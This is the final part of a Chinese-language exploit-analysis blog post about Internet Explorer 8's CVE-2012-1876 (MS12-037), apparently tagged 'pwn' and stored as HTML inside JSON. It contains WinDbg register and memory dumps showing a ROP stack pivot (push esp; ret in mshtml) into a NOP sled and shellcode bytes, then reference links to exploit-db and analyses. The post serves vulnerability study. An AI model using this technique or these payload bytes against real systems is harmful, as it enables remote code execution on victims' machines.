20588b18 3ce3d301</span><br><span class=\"line\">079f6e48  8b348b49 ff31d601 c1acc031 c7010dcf</span><br><span class=\"line\">079f6e58  f475e038 3bf87d03 e275247d 24588b58</span><br></pre></td></tr></table></figure>\n<p>此时执行最后的push esp（pushad的堆栈已经全部处理完毕）；ret，相当于jmp esp，开始执行栈上的代码，再经过一串nop指令就可以执行我们任意的shellcode了！！！</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b6c3d7e esp=079f6df0 ebp=76042341 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CProgSink::GetClassCounter+0x2:</span><br><span class=\"line\">6b6c3d7e 54              push    esp</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6df0  90909090 90909090 90909090 0089e8fc</span><br><span class=\"line\">079f6e00  89600000 64d231e5 8b30528b 528b0c52</span><br><span class=\"line\">079f6e10  28728b14 264ab70f c031ff31 7c613cac</span><br><span class=\"line\">079f6e20  c1202c02 c7010dcf 5752f0e2 8b10528b</span><br><span class=\"line\">079f6e30  d0013c42 8578408b 014a74c0 488b50d0</span><br><span class=\"line\">079f6e40  20588b18 3ce3d301 8b348b49 ff31d601</span><br><span class=\"line\">079f6e50  c1acc031 c7010dcf f475e038 3bf87d03</span><br><span class=\"line\">079f6e60  e275247d 24588b58 8b66d301 588b4b0c</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b6c3d7f esp=079f6dec ebp=76042341 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CProgSink::GetClassCounter+0x3:</span><br><span class=\"line\">6b6c3d7f c3              ret</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6dec  079f6df0 90909090 90909090 90909090</span><br><span class=\"line\">079f6dfc  0089e8fc 89600000 64d231e5 8b30528b</span><br><span class=\"line\">079f6e0c  528b0c52 28728b14 264ab70f c031ff31</span><br><span class=\"line\">079f6e1c  7c613cac c1202c02 c7010dcf 5752f0e2</span><br><span class=\"line\">079f6e2c  8b10528b d0013c42 8578408b 014a74c0</span><br><span class=\"line\">079f6e3c  488b50d0 20588b18 3ce3d301 8b348b49</span><br><span class=\"line\">079f6e4c  ff31d601 c1acc031 c7010dcf f475e038</span><br><span class=\"line\">079f6e5c  3bf87d03 e275247d 24588b58 8b66d301</span><br></pre></td></tr></table></figure>\n<h3 id=\"6-参考链接\"><a href=\"#6-参考链接\" class=\"headerlink\" title=\"6.参考链接\"></a>6.参考链接</h3><p><a href=\"https://paper.seebug.org/179/\" target=\"_blank\" rel=\"noopener\">Windbg漏洞分析调试(一)</a></p>\n<p><a href=\"https://paper.seebug.org/182/\" target=\"_blank\" rel=\"noopener\">Windbg漏洞分析调试(二)</a></p>\n<p><a href=\"https://www.exploit-db.com/exploits/24017\" target=\"_blank\" rel=\"noopener\">Microsoft Internet Explorer 8 - Fixed Col Span ID (Full ASLR + DEP Bypass) (MS12-037)</a></p>\n<p><a href=\"http://c00c.cc/1493200282.html\" target=\"_blank\" rel=\"noopener\">CVE-2012-1876分析</a></p>\n<p><a href=\"http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html\" target=\"_blank\" rel=\"noopener\">Targeted Heap Spraying – 0x0c0c0c0c is a Thing of the Past</a></p>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]}